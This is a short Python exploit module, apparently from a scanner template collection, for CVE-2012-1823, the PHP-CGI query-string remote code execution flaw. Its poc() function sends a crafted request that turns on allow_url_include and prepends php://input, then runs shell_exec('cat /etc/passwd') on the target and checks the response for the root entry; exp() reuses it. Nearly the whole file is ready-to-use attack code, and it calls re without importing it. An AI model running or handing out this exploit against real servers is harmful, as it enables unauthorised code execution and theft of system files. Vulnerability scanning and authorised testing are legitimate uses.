import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''PHP CGI v5.3.12/5.4.2 RCE''',
        "description": '''sapi/cgi/cgi_main.c in PHP before 5.3.12 and 5.4.x before 5.4.2, when configured as a CGI script (aka php-cgi), does not properly handle query strings that lack an = (equals sign) character, which allows remote attackers to execute arbitrary code by placing command-line options in the query string, related to lack of skipping a certain php_getopt for the 'd' case.''',
        "severity": "critical",
        "references": [
            "https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823", 
            "https://nvd.nist.gov/vuln/detail/CVE-2012-1823"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "CVE-2012-1823",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["rce", "php", "cve", "cve2012"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input"""
        method = "POST"
        data = """<?php echo shell_exec("cat /etc/passwd"); ?>"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0""",resp0.text)) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url